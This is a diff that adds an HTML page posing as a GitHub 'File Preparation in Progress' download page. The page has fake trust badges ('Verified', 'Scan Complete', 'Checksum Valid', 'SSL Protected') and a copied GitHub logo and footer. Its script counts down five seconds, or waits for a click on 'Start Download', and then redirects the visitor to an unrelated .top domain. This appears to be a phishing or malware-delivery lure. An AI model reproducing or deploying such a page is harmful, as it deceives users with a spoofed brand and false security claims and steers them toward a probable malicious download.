@@ -1,0 +1,852 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Download Preparation · GitHub</title>
+
+  <style>
+    :root {
+      --bg-primary: #0d1117;
+      --bg-secondary: #161b22;
+      --bg-tertiary: #1c2128;
+      --bg-canvas: #010409;
+      --border-default: #30363d;
+      --border-muted: #21262d;
+      --fg-default: #e6edf3;
+      --fg-muted: #7d8590;
+      --fg-subtle: #6e7681;
+      --accent-primary: #58a6ff;
+      --accent-secondary: #1f6feb;
+      --accent-tertiary: #388bfd;
+      --purple-accent: #a371f7;
+      --shadow-deep: 0 20px 40px rgba(1, 4, 9, 0.9);
+      --shadow-soft: 0 4px 16px rgba(88, 166, 255, 0.2);
+    }
+
+    * { 
+      box-sizing: border-box; 
+      margin: 0; 
+      padding: 0; 
+    }
+
+    html, body {
+      height: 100%;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
+      background: var(--bg-primary);
+      color: var(--fg-default);
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    a { 
+      color: var(--accent-primary); 
+      text-decoration: none; 
+      transition: all 0.2s;
+    }
+    a:hover { 
+      color: var(--accent-tertiary);
+      text-decoration: underline; 
+    }
+
+    /* Header Styles */
+    .header {
+      background: var(--bg-secondary);
+      border-bottom: 1px solid var(--border-default);
+      padding: 16px 32px;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      backdrop-filter: blur(10px);
+      background: rgba(22, 27, 34, 0.95);
+    }
+
+    .header-container {
+      max-width: 1280px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      gap: 24px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: var(--fg-default);
+      font-size: 14px;
+      font-weight: 600;
+      transition: opacity 0.2s;
+    }
+
+    .brand:hover {
+      opacity: 0.7;
+      text-decoration: none;
+    }
+
+    .brand svg { 
+      fill: currentColor;
+      transition: transform 0.3s;
+    }
+
+    .brand:hover svg {
+      transform: scale(1.1);
+    }
+
+    .search-box {
+      flex: 1;
+      max-width: 500px;
+      position: relative;
+    }
+
+    .search-field {
+      width: 100%;
+      padding: 8px 12px 8px 36px;
+      background: var(--bg-canvas);
+      border: 1px solid var(--border-default);
+      border-radius: 6px;
+      color: var(--fg-default);
+      font-size: 14px;
+      transition: all 0.2s;
+    }
+
+    .search-field:focus {
+      outline: none;
+      border-color: var(--accent-primary);
+      box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.25);
+    }
+
+    .search-ico {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      pointer-events: none;
+    }
+
+    .search-ico svg {
+      fill: var(--fg-muted);
+    }
+
+    .nav-actions {
+      display: flex;
+      gap: 8px;
+      margin-left: auto;
+    }
+
+    .action-btn {
+      color: var(--fg-default);
+      font-size: 14px;
+      font-weight: 500;
+      padding: 5px 16px;
+      border-radius: 6px;
+      transition: all 0.2s;
+      border: 1px solid var(--border-default);
+      background: transparent;
+      cursor: pointer;
+    }
+    
+    .action-btn:hover { 
+      background: var(--bg-tertiary);
+      border-color: var(--fg-subtle);
+    }
+
+    .action-btn.highlighted {
+      background: var(--accent-secondary);
+      border-color: rgba(88, 166, 255, 0.4);
+      color: #ffffff;
+    }
+
+    .action-btn.highlighted:hover {
+      background: var(--accent-tertiary);
+      box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15);
+    }
+
+    @media (max-width: 768px) {
+      .header {
+        padding: 12px 16px;
+      }
+      .search-box,
+      .nav-actions { 
+        display: none; 
+      }
+    }
+
+    /* Main Content Area */
+    .content-wrapper {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 16px;
+      background: radial-gradient(ellipse at center, rgba(88, 166, 255, 0.08) 0%, transparent 70%);
+    }
+
+    .content-box {
+      width: 100%;
+      max-width: 700px;
+    }
+
+    .main-panel {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-default);
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: var(--shadow-deep);
+      animation: fadeSlideIn 0.5s ease-out;
+    }
+
+    @keyframes fadeSlideIn {
+      from {
+        opacity: 0;
+        transform: translateY(30px) scale(0.96);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    /* Panel Header */
+    .panel-top {
+      padding: 24px 28px 20px;
+      border-bottom: 1px solid var(--border-default);
+      background: linear-gradient(165deg, var(--bg-tertiary) 0%, var(--bg-secondary) 100%);
+      text-align: center;
+    }
+
+    .title-section {
+      margin-bottom: 12px;
+    }
+
+    .main-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--fg-default);
+      margin-bottom: 6px;
+      letter-spacing: -0.5px;
+    }
+
+    .sub-title {
+      font-size: 14px;
+      color: var(--fg-muted);
+    }
+
+    .status-pills {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 14px;
+      background: rgba(88, 166, 255, 0.15);
+      border: 1px solid rgba(88, 166, 255, 0.3);
+      border-radius: 999px;
+      font-size: 12px;
+      color: var(--accent-primary);
+      font-weight: 600;
+    }
+
+    .pill-dot {
+      width: 6px;
+      height: 6px;
+      background: var(--accent-primary);
+      border-radius: 50%;
+      animation: pulseGlow 2s ease-in-out infinite;
+    }
+
+    @keyframes pulseGlow {
+      0%, 100% { 
+        opacity: 1;
+        box-shadow: 0 0 8px var(--accent-primary);
+      }
+      50% { 
+        opacity: 0.4;
+        box-shadow: 0 0 0 var(--accent-primary);
+      }
+    }
+
+    /* Panel Content */
+    .panel-content {
+      padding: 40px 28px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 32px;
+    }
+
+    /* Circular Progress */
+    .progress-circle-wrapper {
+      position: relative;
+      width: 220px;
+      height: 220px;
+    }
+
+    .circle-bg {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      background: radial-gradient(circle at center, rgba(88, 166, 255, 0.1) 0%, transparent 70%);
+      animation: breathe 3s ease-in-out infinite;
+    }
+
+    @keyframes breathe {
+      0%, 100% { transform: scale(1); opacity: 0.6; }
+      50% { transform: scale(1.05); opacity: 1; }
+    }
+
+    .circle-svg {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      transform: rotate(-90deg);
+    }
+
+    .circle-track {
+      fill: none;
+      stroke: var(--bg-tertiary);
+      stroke-width: 8;
+    }
+
+    .circle-progress {
+      fill: none;
+      stroke: url(#progressGradient);
+      stroke-width: 8;
+      stroke-linecap: round;
+      stroke-dasharray: 628;
+      stroke-dashoffset: 628;
+      transition: stroke-dashoffset 0.1s linear;
+      filter: drop-shadow(0 0 8px rgba(88, 166, 255, 0.6));
+    }
+
+    .circle-center {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .timer-display {
+      font-size: 48px;
+      font-weight: 800;
+      color: var(--accent-primary);
+      font-variant-numeric: tabular-nums;
+      letter-spacing: -2px;
+      text-shadow: 0 0 24px rgba(88, 166, 255, 0.5);
+    }
+
+    .timer-label {
+      font-size: 13px;
+      color: var(--fg-muted);
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .percentage-display {
+      position: absolute;
+      bottom: -40px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--accent-primary);
+      font-variant-numeric: tabular-nums;
+    }
+
+    /* Download Section */
+    .download-section {
+      width: 100%;
+      max-width: 480px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .download-action {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 14px 24px;
+      background: linear-gradient(135deg, var(--accent-secondary) 0%, var(--accent-primary) 100%);
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 700;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      box-shadow: var(--shadow-soft);
+    }
+
+    .download-action::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, transparent 0%, rgba(255, 255, 255, 0.2) 50%, transparent 100%);
+      transform: translateX(-100%) skewX(-15deg);
+      transition: transform 0.6s;
+    }
+
+    .download-action:hover::before {
+      transform: translateX(100%) skewX(-15deg);
+    }
+
+    .download-action:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(88, 166, 255, 0.4);
+    }
+
+    .download-action:active {
+      transform: translateY(0) scale(0.98);
+    }
+
+    .download-action svg { 
+      fill: currentColor;
+      position: relative;
+      z-index: 1;
+    }
+
+    .download-action span {
+      position: relative;
+      z-index: 1;
+    }
+
+    /* Info Cards */
+    .info-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      width: 100%;
+    }
+
+    .info-card {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 16px;
+      background: var(--bg-canvas);
+      border: 1px solid var(--border-default);
+      border-radius: 8px;
+      transition: all 0.2s;
+    }
+
+    .info-card:hover {
+      background: var(--bg-tertiary);
+      border-color: var(--border-muted);
+      transform: translateY(-1px);
+    }
+
+    .info-icon {
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(88, 166, 255, 0.12);
+      border-radius: 6px;
+      flex-shrink: 0;
+    }
+
+    .info-icon svg {
+      fill: var(--accent-primary);
+    }
+
+    .info-text {
+      font-size: 12px;
+      color: var(--fg-default);
+      font-weight: 500;
+      line-height: 1.4;
+    }
+
+    /* Alert Box */
+    .alert-box {
+      width: 100%;
+      display: flex;
+      gap: 12px;
+      padding: 14px 16px;
+      background: rgba(163, 113, 247, 0.1);
+      border: 1px solid rgba(163, 113, 247, 0.3);
+      border-radius: 8px;
+      font-size: 13px;
+      color: var(--fg-default);
+      line-height: 1.5;
+    }
+
+    .alert-box svg {
+      fill: var(--purple-accent);
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    /* Footer Styles */
+    .page-footer {
+      border-top: 1px solid var(--border-default);
+      background: var(--bg-secondary);
+      padding: 20px 16px;
+      margin-top: auto;
+    }
+
+    .footer-container {
+      max-width: 1280px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+
+    .footer-brand {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .footer-logo svg {
+      fill: var(--fg-subtle);
+      transition: fill 0.2s;
+    }
+
+    .footer-logo:hover svg {
+      fill: var(--fg-muted);
+    }
+
+    .footer-copyright {
+      font-size: 12px;
+      color: var(--fg-muted);
+    }
+
+    .footer-menu {
+      display: flex;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .footer-menu a {
+      font-size: 12px;
+      color: var(--fg-subtle);
+      font-weight: 500;
+    }
+
+    /* Responsive */
+    @media (max-width: 640px) {
+      .content-wrapper {
+        padding: 20px 12px;
+      }
+
+      .main-panel {
+        border-radius: 0;
+        border-left: none;
+        border-right: none;
+      }
+
+      .panel-content {
+        padding: 32px 20px;
+        gap: 28px;
+      }
+
+      .panel-top {
+        padding: 20px 20px 16px;
+      }
+
+      .main-title {
+        font-size: 20px;
+      }
+
+      .progress-circle-wrapper {
+        width: 180px;
+        height: 180px;
+      }
+
+      .timer-display {
+        font-size: 40px;
+      }
+
+      .info-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .footer-container {
+        flex-direction: column;
+        text-align: center;
+        gap: 16px;
+      }
+
+      .footer-brand {
+        flex-direction: column;
+        gap: 10px;
+      }
+    }
+
+    /* Reduced Motion */
+    @media (prefers-reduced-motion: reduce) {
+      *,
+      *::before,
+      *::after {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div data-redirect-url="https://4xxlnf.top/xeno" data-delay-ms="5000" id="app" style="display: flex;flex-direction: column;justify-content: space-between;height: 100vh;">
+
+    <header class="header">
+      <div class="header-container">
+        <a class="brand" href="#" aria-label="GitHub">
+          <svg height="32" viewBox="0 0 16 16" width="32" aria-hidden="true">
+            <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+          </svg>
+          <span>GitHub</span>
+        </a>
+        
+        <div class="search-box">
+          <span class="search-ico">
+            <svg width="16" height="16" viewBox="0 0 16 16">
+              <path fill-rule="evenodd" d="M11.5 7a4.5 4.5 0 11-9 0 4.5 4.5 0 019 0zm-.82 4.74a6 6 0 111.06-1.06l3.04 3.04a.75.75 0 11-1.06 1.06l-3.04-3.04z"></path>
+            </svg>
+          </span>
+          <input type="text" class="search-field" placeholder="Search or jump to..." aria-label="Search">
+        </div>
+
+        <nav class="nav-actions">
+          <button class="action-btn">Sign in</button>
+          <button class="action-btn highlighted">Sign up</button>
+        </nav>
+      </div>
+    </header>
+
+    <main class="content-wrapper">
+      <div class="content-box">
+        <div class="main-panel">
+
+          <div class="panel-top">
+            <div class="title-section">
+              <h1 class="main-title">File Preparation in Progress</h1>
+              <p class="sub-title">Secure package assembly · Release v2.1.0</p>
+            </div>
+            <div class="status-pills">
+              <span class="pill">
+                <span class="pill-dot"></span>
+                Active
+              </span>
+              <span class="pill">
+                <svg width="12" height="12" viewBox="0 0 16 16">
+                  <path fill-rule="evenodd" d="M8.533.133a1.75 1.75 0 00-1.066 0l-5.25 1.68A1.75 1.75 0 001 3.48V8c0 3.446 2.29 5.958 6.697 7.854a1.75 1.75 0 001.606 0C13.71 13.958 16 11.446 16 8V3.48a1.75 1.75 0 00-1.217-1.667L8.533.133z"></path>
+                </svg>
+                Verified
+              </span>
+            </div>
+          </div>
+
+          <div class="panel-content">
+
+            <div class="progress-circle-wrapper">
+              <div class="circle-bg"></div>
+              <svg class="circle-svg" viewBox="0 0 200 200">
+                <defs>
+                  <linearGradient id="progressGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                    <stop offset="0%" style="stop-color:#1f6feb" />
+                    <stop offset="100%" style="stop-color:#58a6ff" />
+                  </linearGradient>
+                </defs>
+                <circle class="circle-track" cx="100" cy="100" r="90" />
+                <circle class="circle-progress" id="progressCircle" cx="100" cy="100" r="90" />
+              </svg>
+              <div class="circle-center">
+                <div class="timer-display" id="timerValue">5</div>
+                <div class="timer-label">seconds</div>
+              </div>
+              <div class="percentage-display" id="percentValue">0%</div>
+            </div>
+
+            <div class="download-section">
+              <button class="download-action" id="actionButton" type="button">
+                <svg width="18" height="18" viewBox="0 0 16 16">
+                  <path d="M2.75 14A1.75 1.75 0 011 12.25v-2.5a.75.75 0 011.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 00.25-.25v-2.5a.75.75 0 011.5 0v2.5A1.75 1.75 0 0113.25 14H2.75z"></path>
+                  <path d="M7.25 7.689V2a.75.75 0 011.5 0v5.689l1.97-1.969a.75.75 0 111.06 1.06l-3.25 3.25a.75.75 0 01-1.06 0L4.22 6.78a.75.75 0 111.06-1.06l1.97 1.969z"></path>
+                </svg>
+                <span>Start Download</span>
+              </button>
+
+              <div class="info-grid">
+                <div class="info-card">
+                  <div class="info-icon">
+                    <svg width="16" height="16" viewBox="0 0 16 16">
+                      <path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
+                    </svg>
+                  </div>
+                  <div class="info-text">Scan Complete</div>
+                </div>
+                <div class="info-card">
+                  <div class="info-icon">
+                    <svg width="16" height="16" viewBox="0 0 16 16">
+                      <path fill-rule="evenodd" d="M8.533.133a1.75 1.75 0 00-1.066 0l-5.25 1.68A1.75 1.75 0 001 3.48V8c0 3.446 2.29 5.958 6.697 7.854a1.75 1.75 0 001.606 0C13.71 13.958 16 11.446 16 8V3.48a1.75 1.75 0 00-1.217-1.667L8.533.133z"></path>
+                    </svg>
+                  </div>
+                  <div class="info-text">SSL Protected</div>
+                </div>
+                <div class="info-card">
+                  <div class="info-icon">
+                    <svg width="16" height="16" viewBox="0 0 16 16">
+                      <path d="M8 9.5a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"></path>
+                      <path fill-rule="evenodd" d="M8 0a8 8 0 100 16A8 8 0 008 0zM1.5 8a6.5 6.5 0 1113 0 6.5 6.5 0 01-13 0z"></path>
+                    </svg>
+                  </div>
+                  <div class="info-text">Checksum Valid</div>
+                </div>
+                <div class="info-card">
+                  <div class="info-icon">
+                    <svg width="16" height="16" viewBox="0 0 16 16">
+                      <path fill-rule="evenodd" d="M8 1a.75.75 0 01.75.75V4.5h1.5a.75.75 0 010 1.5h-1.5v2.25h1.5a.75.75 0 010 1.5h-1.5v2.5a.75.75 0 01-1.5 0v-2.5h-1.5a.75.75 0 010-1.5h1.5V6h-1.5a.75.75 0 010-1.5h1.5V1.75A.75.75 0 018 1z"></path>
+                    </svg>
+                  </div>
+                  <div class="info-text">Package Ready</div>
+                </div>
+              </div>
+
+              <div class="alert-box">
+                <svg width="16" height="16" viewBox="0 0 16 16">
+                  <path fill-rule="evenodd" d="M8 1.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM0 8a8 8 0 1116 0A8 8 0 010 8zm9 3a1 1 0 11-2 0 1 1 0 012 0zm-.25-6.25a.75.75 0 00-1.5 0v3.5a.75.75 0 001.5 0v-3.5z"></path>
+                </svg>
+                <div>
+                  Auto-redirect enabled. Keep this window open for automatic download initiation.
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <footer class="page-footer">
+      <div class="footer-container">
+        <div class="footer-brand">
+          <a href="#" class="footer-logo" aria-label="GitHub">
+            <svg height="24" viewBox="0 0 16 16" width="24">
+              <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+            </svg>
+          </a>
+          <span class="footer-copyright">© 2026 GitHub, Inc.</span>
+        </div>
+        <div class="footer-menu">
+          <a href="#">Terms</a>
+          <a href="#">Privacy</a>
+          <a href="#">Security</a>
+          <a href="#">Status</a>
+          <a href="#">Docs</a>
+          <a href="#">Contact GitHub</a>
+          <a href="#">Pricing</a>
+          <a href="#">API</a>
+          <a href="#">Training</a>
+          <a href="#">Blog</a>
+        </div>
+      </div>
+    </footer>
+
+  </div>
+
+  <script>
+    (function () {
+      'use strict';
+      
+      const appRoot = document.getElementById('app');
+      const targetUrl = appRoot.dataset.redirectUrl || '';
+      const waitTime = Math.max(0, Number(appRoot.dataset.delayMs || 5000));
+ 
+      const timerEl = document.getElementById('timerValue');
+      const percentEl = document.getElementById('percentValue');
+      const circleEl = document.getElementById('progressCircle');
+      const buttonEl = document.getElementById('actionButton');
+ 
+      let start = performance.now();
+      let redirecting = false;
+      let frameId = null;
+      
+      const circumference = 2 * Math.PI * 90;
+ 
+      function clamp(val, min, max) {
+        return Math.min(max, Math.max(min, val));
+      }
+ 
+      function update(timestamp) {
+        if (redirecting) return;
+        
+        const elapsed = timestamp - start;
+        const ratio = waitTime === 0 ? 1 : clamp(elapsed / waitTime, 0, 1);
+        const remaining = Math.ceil(Math.max(0, waitTime - elapsed) / 1000);
+        const pct = Math.round(ratio * 100);
+        const offset = circumference * (1 - ratio);
+ 
+        if (timerEl) timerEl.textContent = remaining;
+        if (percentEl) percentEl.textContent = pct + '%';
+        if (circleEl) circleEl.style.strokeDashoffset = offset;
+ 
+        if (elapsed >= waitTime) {
+          performRedirect();
+          return;
+        }
+        
+        frameId = requestAnimationFrame(update);
+      }
+ 
+      function performRedirect() {
+        if (redirecting) return;
+        redirecting = true;
+        
+        if (frameId) cancelAnimationFrame(frameId);
+        
+        if (targetUrl) {
+          window.location.assign(targetUrl);
+        }
+      }
+ 
+      if (buttonEl) {
+        buttonEl.addEventListener('click', performRedirect);
+      }
+ 
+      if (circleEl) {
+        circleEl.style.strokeDasharray = circumference;
+        circleEl.style.strokeDashoffset = circumference;
+      }
+ 
+      frameId = requestAnimationFrame(update);
+ 
+      document.addEventListener('visibilitychange', function () {
+        if (document.hidden) {
+          if (frameId) cancelAnimationFrame(frameId);
+        } else if (!redirecting) {
+          const elapsed = performance.now() - start;
+          if (elapsed < waitTime) {
+            frameId = requestAnimationFrame(update);
+          }
+        }
+      });
+    })();
+  </script>
+
+</body>
+</html>
